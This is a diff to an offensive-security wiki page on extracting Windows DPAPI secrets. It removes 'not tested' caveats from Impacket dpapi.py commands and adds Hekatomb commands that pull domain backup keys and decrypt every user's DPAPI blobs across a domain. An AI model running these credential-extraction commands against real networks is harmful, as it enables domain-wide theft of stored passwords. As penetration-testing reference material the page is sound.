@@ -28,14 +28,14 @@ C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
 From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).
 
 ```bash
-# (not tested) Decrypt a master key
+# Decrypt a master key
 dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD
 
-# (not tested) Obtain the backup keys & use it to decrypt a master key
-dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
+# Obtain the backup keys & use it to decrypt a master key
+dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET --export
 dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"
 
-# (not tested) Decrypt DPAPI-protected data using a master key
+# Decrypt DPAPI-protected data using a master key
 dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
 ```
 
@@ -43,6 +43,16 @@ dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
 
 ```bash
 DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
+```
+
+[Hekatomb](https://github.com/Processus-Thief/HEKATOMB) (python script) can also be used. It connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers and uses Domain backup keys to decrypt them.
+
+```bash
+# Obtain the backup keys & use it to decrypt all blob from users
+hekatomb $DOMAIN/$USER:$PASSWORD@$TARGET
+
+# Decrypt all blob from users using saved backup key
+hekatomb -pkv /path/to/backup_key.pvk $DOMAIN/$USER:$PASSWORD@$TARGET
 ```
 {% endtab %}
 
@@ -74,6 +84,3 @@ dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
 {% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}
 
 {% embed url="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf" %}
-
-
-
